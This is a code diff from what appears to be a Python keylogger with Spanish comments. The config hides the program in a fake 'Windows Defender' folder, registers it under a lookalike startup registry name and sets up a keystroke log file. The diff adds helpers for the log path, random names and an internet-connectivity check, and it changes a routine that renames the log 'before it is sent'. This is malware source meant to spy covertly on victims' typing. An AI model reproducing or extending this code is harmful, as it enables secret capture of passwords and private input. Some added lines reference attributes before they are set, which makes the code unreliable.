@@ -41,6 +41,7 @@ class Config:
         self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
         self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
         self.PATH_KEY = self.PATH_OCULT+self.NAME_KEY                               # <No cambiar>
+        self.PATH_LOG = self.LOG_KEY_PATH+self.LOG_NAME
         self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
         self.LOG_NAME = "reg"+ "." + "k"                                            # Nombre y extensión del registro
         # Importante
@@ -84,7 +85,20 @@ class Functions:
             return False    # La carpeta ya existe
         pass
 
+    def random_char(y=5):
+        return ''.join(random.choice(string.ascii_letters) for x in range(y))
 
+    # Función = Verifica si hay conexión a internet para poder envíar el log
+    def VerificarConexion():
+        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
+        try:                                                            # Intenta conectarse al servidor de Google
+            con.connect(('www.google.com', 80))
+            con.close()
+            print("[Test Internet] => [OK]")
+            return True
+        except:
+            print("[Test Internet] => [NO]")
+            return False
 
 class Util:
     def __init__(self): #Constructor?
@@ -101,13 +115,12 @@ class Util:
         except:
             print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
 
-    def RenameFileKey(self): # Renombre el archivo log, antes de ser envíado
+    def RenameFileKey(self,name): # Renombre el archivo log, antes de ser envíado
         try:
-            CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
+            self.CreateFolders()  # Crea el directorios [Evita posibles errores]
             # Copia el archivo
-            pathO = logKeyPath() + LogName()
-            pathN = logKeyPath() + name
-            os.rename(pathO, pathN)
+            path = Config().LOG_KEY_PATH+ name
+            os.rename(Config().PATH_LOG, path)
             print("El archivo reg.k se renombró correctamente")
         except:
             print("No se puedo renombrar el archivo 'reg.k' ")
